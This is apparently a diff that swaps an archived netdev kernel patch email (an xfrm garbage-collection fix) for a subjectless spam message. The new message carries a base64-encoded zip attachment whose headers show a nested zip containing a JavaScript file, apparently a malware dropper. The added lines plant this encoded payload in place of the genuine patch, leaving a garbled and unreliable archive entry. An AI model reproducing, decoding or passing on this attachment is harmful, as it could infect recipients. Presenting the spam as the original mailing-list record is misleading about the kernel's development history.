@@ -1,95 +1,74 @@
-From: Hangbin Liu <liuhangbin@gmail.com>
-Subject: [PATCHv3 net] xfrm: move xfrm_garbage_collect out of xfrm_policy_flush
-Date: Sun, 11 Jun 2017 09:44:20 +0800
-Message-ID: <1497145460-24614-1-git-send-email-liuhangbin@gmail.com>
-References: <1497013755-24481-1-git-send-email-liuhangbin@gmail.com>
-Cc: David Miller <davem@davemloft.net>,
-        Xin Long <lucien.xin@gmail.com>,
-        Steffen Klassert <steffen.klassert@secunet.com>,
-        Hangbin Liu <liuhangbin@gmail.com>
-To: netdev@vger.kernel.org
+From: <energi@aaengineering.se>
+Subject: (unknown)
+Date: Sun, 11 Jun 2017 02:29:06 -0000
+Message-ID: <149714814663.8929.10590539086358277724@surnet.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="16633582951.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-pf0-f196.google.com ([209.85.192.196]:33035 "EHLO
-        mail-pf0-f196.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751661AbdFKBpA (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sat, 10 Jun 2017 21:45:00 -0400
-Received: by mail-pf0-f196.google.com with SMTP id w12so2622169pfk.0
-        for <netdev@vger.kernel.org>; Sat, 10 Jun 2017 18:45:00 -0700 (PDT)
-In-Reply-To: <1497013755-24481-1-git-send-email-liuhangbin@gmail.com>
+Received: from ip-178-46-163-135.adsl.surnet.ru ([178.46.163.135]:53672 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751608AbdFKC3K (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sat, 10 Jun 2017 22:29:10 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Now we will force to do garbage collection if any policy removed in
-xfrm_policy_flush(). But during xfrm_net_exit(). We call flow_cache_fini()
-first and set set fc->percpu to NULL. Then after we call xfrm_policy_fini()
--> frxm_policy_flush() -> flow_cache_flush(), we will get NULL pointer
-dereference when check percpu_empty. The code path looks like:
-
-flow_cache_fini()
-  - fc->percpu = NULL
-xfrm_policy_fini()
-  - xfrm_policy_flush()
-    - xfrm_garbage_collect()
-      - flow_cache_flush()
-        - flow_cache_percpu_empty()
-	  - fcp = per_cpu_ptr(fc->percpu, cpu)
-
-To reproduce, just add ipsec in netns and then remove the netns.
-
-v2:
-As Xin Long suggested, since only two other places need to call it. move
-xfrm_garbage_collect() outside xfrm_policy_flush().
-
-v3:
-Fix subject mismatch after v2 fix.
-
-Fixes: 35db06912189 ("xfrm: do the garbage collection after flushing policy")
-Signed-off-by: Hangbin Liu <liuhangbin@gmail.com>
----
- net/key/af_key.c       | 2 ++
- net/xfrm/xfrm_policy.c | 4 ----
- net/xfrm/xfrm_user.c   | 1 +
- 3 files changed, 3 insertions(+), 4 deletions(-)
-
-diff --git a/net/key/af_key.c b/net/key/af_key.c
-index 512dc43..5103f92 100644
---- a/net/key/af_key.c
-+++ b/net/key/af_key.c
-@@ -2755,6 +2755,8 @@ static int pfkey_spdflush(struct sock *sk, struct sk_buff *skb, const struct sad
- 	int err, err2;
- 
- 	err = xfrm_policy_flush(net, XFRM_POLICY_TYPE_MAIN, true);
-+	if (!err)
-+		xfrm_garbage_collect(net);
- 	err2 = unicast_flush_resp(sk, hdr);
- 	if (err || err2) {
- 		if (err == -ESRCH) /* empty table - old silent behavior */
-diff --git a/net/xfrm/xfrm_policy.c b/net/xfrm/xfrm_policy.c
-index ed4e52d..643a18f 100644
---- a/net/xfrm/xfrm_policy.c
-+++ b/net/xfrm/xfrm_policy.c
-@@ -1006,10 +1006,6 @@ int xfrm_policy_flush(struct net *net, u8 type, bool task_valid)
- 		err = -ESRCH;
- out:
- 	spin_unlock_bh(&net->xfrm.xfrm_policy_lock);
--
--	if (cnt)
--		xfrm_garbage_collect(net);
--
- 	return err;
- }
- EXPORT_SYMBOL(xfrm_policy_flush);
-diff --git a/net/xfrm/xfrm_user.c b/net/xfrm/xfrm_user.c
-index 38614df..86116e9 100644
---- a/net/xfrm/xfrm_user.c
-+++ b/net/xfrm/xfrm_user.c
-@@ -2027,6 +2027,7 @@ static int xfrm_flush_policy(struct sk_buff *skb, struct nlmsghdr *nlh,
- 			return 0;
- 		return err;
- 	}
-+	xfrm_garbage_collect(net);
- 
- 	c.data.type = type;
- 	c.event = nlh->nlmsg_type;
--- 
-2.5.5
+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
